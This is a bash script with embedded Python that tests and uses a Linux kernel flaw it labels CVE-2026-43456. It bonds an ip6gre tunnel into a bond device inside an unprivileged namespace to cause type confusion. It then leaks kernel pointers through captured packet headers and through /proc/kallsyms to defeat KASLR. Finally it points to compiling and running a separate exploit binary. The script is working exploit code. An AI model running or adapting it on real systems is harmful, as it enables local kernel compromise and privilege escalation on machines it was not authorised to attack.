#!/bin/bash
# CVE-2026-43456 quick verify + KASLR leak test
# Run: bash cve43456_verify.sh
echo "=== CVE-2026-43456 Verify ==="
echo "    kernel: $(uname -r)"

check_ns() {
    v=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo 0)
    [ "$v" -gt 0 ] && echo "[+] user_namespaces = $v" || { echo "[-] disabled"; exit 1; }
}
check_ns

echo "[*] entering net namespace..."
unshare -Urn -- bash -s <<'NS'
set -u
echo "[+] inside ns, uid=$(id -u)"

ip link set lo up 2>/dev/null

# ── dummy0 with IPv6 ──
ip link add dummy0 type dummy 2>/dev/null || modprobe dummy 2>/dev/null
ip link add dummy0 type dummy 2>/dev/null || true
ip link set dummy0 up
ip -6 addr add fd00::1/64 dev dummy0
ip -6 route add fd00::2/128 dev dummy0 2>/dev/null || true
echo "[+] dummy0: $(ip -6 addr show dummy0 | grep inet6 | awk '{print $2}')"

# ── ip6gre0 with IPv6 endpoints ──
ip link add ip6gre0 type ip6gre local fd00::1 remote fd00::2 2>/dev/null \
    || { modprobe ip6_gre 2>/dev/null
         ip link add ip6gre0 type ip6gre local fd00::1 remote fd00::2 2>/dev/null; }
ip link set ip6gre0 up 2>/dev/null || true
echo "[+] ip6gre0 created"

# ── bond0 ──
ip link add bond0 type bond mode active-backup 2>/dev/null \
    || { modprobe bonding 2>/dev/null
         ip link add bond0 type bond mode active-backup; }
ip link set bond0 up

# ── KEY: enslave ──
if ip link set ip6gre0 master bond0 2>/dev/null; then
    echo ""
    echo "[+] ══════════════════════════════════"
    echo "[+] VULNERABLE! ip6gre0 enslaved to bond0"
    echo "[+] bond0->header_ops = &ip6gre_header_ops"
    echo "[+] netdev_priv(bond0) = struct bonding* (type confusion active)"
    echo "[+] bonding+0x38 will leak as IPv6 src in captured packets"
    echo "[+] ══════════════════════════════════"
else
    echo "[-] enslavement failed — not vulnerable or module missing"
    exit 1
fi

# Check kallsyms readable
kptr=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null || echo ?)
lines=$(wc -l < /proc/kallsyms 2>/dev/null || echo 0)
echo ""
echo "[*] kptr_restrict=$kptr, kallsyms lines=$lines"

brcv=$(grep ' bond_rcv_validate$' /proc/kallsyms 2>/dev/null | awk '{print $1}')
if [ -n "$brcv" ] && [ "$brcv" != "0000000000000000" ]; then
    echo "[+] KALLSYMS READABLE! bond_rcv_validate=0x$brcv"
    _txt=$(grep ' _text$' /proc/kallsyms | awk '{print $1}')
    echo "[+] _text=0x${_txt:-unknown}"
    echo "[+] kernel base likely from _text"
else
    echo "[~] kallsyms shows 0s (kptr_restrict) — need packet leak"
fi

# ── Packet leak test via python3 ──
echo ""
echo "[*] testing packet capture leak..."
ip addr add 10.10.10.1/24 dev bond0 2>/dev/null || true
ip neigh add 10.10.10.100 lladdr de:ad:be:ef:00:01 nud permanent dev bond0 2>/dev/null || true

python3 - <<'PY' 2>/dev/null || echo "[~] python3 test skipped"
import socket, struct, time, threading

OUTER_SRC = bytes([0xfd,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1])  # fd00::1
found = []

def capture():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    s.bind(('dummy0', 0))
    s.settimeout(0.5)
    for _ in range(60):
        try:
            pkt = s.recv(4096)
        except socket.timeout:
            continue
        # scan for nested IPv6
        for i in range(len(pkt)-80):
            if (pkt[i] >> 4) != 6: continue
            src = pkt[i+8:i+24]
            dst = pkt[i+24:i+40]
            nxt = pkt[i+6]
            if src == OUTER_SRC and nxt == 47:  # outer ip6gre packet
                # skip GRE (4 bytes min)
                gre_off = i + 40
                inner = gre_off + 4
                if inner + 40 > len(pkt): continue
                if (pkt[inner] >> 4) != 6: continue
                isrc = pkt[inner+8:inner+24]
                hi = int.from_bytes(isrc[:8], 'big')
                lo = int.from_bytes(isrc[8:], 'big')
                if (hi >> 32) == 0xffffffff:
                    found.append(hi)
                    print(f"[!!!] INNER IPv6 src = {isrc.hex()}")
                    print(f"      hi=0x{hi:016x}  (kernel ptr!)")

def probe():
    time.sleep(0.2)
    for _ in range(20):
        try:
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            u.setsockopt(socket.SOL_SOCKET, 25, b'bond0\x00')
            u.bind(('10.10.10.1', 0))
            u.sendto(b'CVE-2026-43456', ('10.10.10.100', 9999))
            u.close()
        except: pass
        time.sleep(0.1)

t = threading.Thread(target=capture, daemon=True)
t.start()
probe()
t.join(timeout=5)

if found:
    print(f"[+] KASLR leak confirmed: 0x{found[0]:016x}")
else:
    print("[-] no kernel ptr in inner IPv6 src (try running C binary)")
PY

echo ""
echo "[*] Done. Next step:"
echo "    gcc -static -O2 -o cve_2026_43456 cve_2026_43456.c && ./cve_2026_43456"
NS
